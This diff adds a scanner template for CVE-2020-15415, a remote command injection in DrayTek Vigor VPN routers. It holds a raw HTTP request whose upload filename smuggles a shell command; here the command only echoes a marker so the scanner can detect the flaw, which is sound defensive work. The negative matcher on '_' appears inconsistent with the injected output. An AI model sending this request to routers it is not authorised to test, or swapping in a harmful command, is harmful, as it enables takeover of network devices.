@@ -1,0 +1,46 @@
+id: draytek-vigor-rce-cve-2020-15415
+info:
+  name: Draytek Vigor Multiple VPN Routers RCE (CVE-2020-15415)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    DrayTek Vigor3900, Vigor2960, and Vigor300B versions prior to 1.5.1 have a remote code execution vulnerability. The vulnerability can be exploited by sending a specially crafted payload to execute shell commands.
+  classification:
+    cve-id: CVE-2020-15415
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: command-execution,rce
+  reference:
+    - https://github.com/CLP-team/Vigor-Commond-Injection
+
+variables:
+  marker: "{{rand_base(16)}}"
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="abc"; filename="t';echo '{{marker}}';echo '_"
+        Content-Type: text/x-python-script
+
+
+
+        ------WebKitFormBoundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{marker}}"
+        part: body
+      - type: word
+        words:
+          - "_"
+        part: body
+        negative: true
